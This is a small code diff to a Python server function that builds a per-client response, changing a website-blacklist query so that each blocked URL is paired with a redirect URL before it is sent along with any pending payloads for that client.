@@ -41,11 +41,11 @@ Pulls blacklist from database
 def construct_response(clientid):
     with getConn() as conn:
         resp = pending_payloads.pop(clientid, None) or new_response(clientid)
-        conn.execute('SELECT URL FROM BlacklistedWebsites')
+        conn.execute('SELECT URL, RedirectURL FROM BlacklistedWebsites')
         blacklist = conn.fetchall()
         blacklistList = []
         for row in blacklist:
-            blacklistList.append(row[0])
+            blacklistList.append({row[0]: row[1]})
         resp["security_blacklist"] = blacklistList
         conn.execute('SELECT Payload FROM PendingPayloads WHERE ClientID = (%s)', clientid)
         payload = conn.fetchall()
